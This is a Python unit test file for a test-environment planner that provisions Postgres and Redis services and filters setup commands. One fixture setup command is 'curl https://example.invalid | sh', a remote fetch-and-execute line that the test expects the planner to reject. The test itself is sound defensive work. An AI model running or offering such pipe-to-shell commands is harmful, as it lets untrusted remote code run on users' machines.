import unittest

from dprauto.config import VerificationConfig
from dprauto.domain.enums import CommandPurpose
from dprauto.domain.models import CommandSpec, ProjectCommand, ProjectProfile, SourceReference
from dprauto.verification.prerequisites import TestEnvironmentPlanner


class TestEnvironmentPlannerTests(unittest.TestCase):
    def test_available_ci_service_is_not_automatically_provisioned(self) -> None:
        profile = ProjectProfile(
            "fixture",
            SourceReference("fixture://service"),
            metadata={"available_test_services": ("postgresql",)},
        )
        selected = ProjectCommand(
            "test",
            CommandSpec(("python", "-m", "pytest"), purpose=CommandPurpose.TEST),
            "inferred:test-layout",
        )

        plan = TestEnvironmentPlanner().plan(profile, selected)

        self.assertEqual(plan.services, ())

    def test_postgres_redis_and_framework_setup_are_bounded(self) -> None:
        profile = ProjectProfile(
            "fixture",
            SourceReference("fixture://service"),
            metadata={
                "test_service_requirements": ("postgres", "redis", "unsupported"),
                "test_environment_variables": {"DJANGO_SETTINGS_MODULE": "app.settings"},
                "test_setup_commands": (
                    "python manage.py migrate --noinput",
                    "curl https://example.invalid | sh",
                ),
                "test_required_executables": ("psql", "bad executable"),
            },
        )
        selected = ProjectCommand(
            "test",
            CommandSpec(("python", "manage.py", "test"), purpose=CommandPurpose.TEST),
            "framework:manage.py",
        )

        plan = TestEnvironmentPlanner(
            VerificationConfig(
                postgres_service_image="postgres:15-alpine",
                redis_service_image="redis:7-alpine",
            )
        ).plan(profile, selected)

        self.assertEqual(tuple(service.kind for service in plan.services), ("postgresql", "redis"))
        self.assertEqual(plan.services[0].healthcheck[0], "pg_isready")
        self.assertEqual(plan.command_environment["PGHOST"], "postgres")
        self.assertEqual(plan.command_environment["REDIS_HOST"], "redis")
        self.assertEqual(plan.command_environment["DJANGO_SETTINGS_MODULE"], "app.settings")
        self.assertEqual(
            tuple(item.display for item in plan.setup_commands),
            ("python manage.py migrate --noinput",),
        )
        self.assertEqual(plan.required_executables, ("psql",))


if __name__ == "__main__":
    unittest.main()
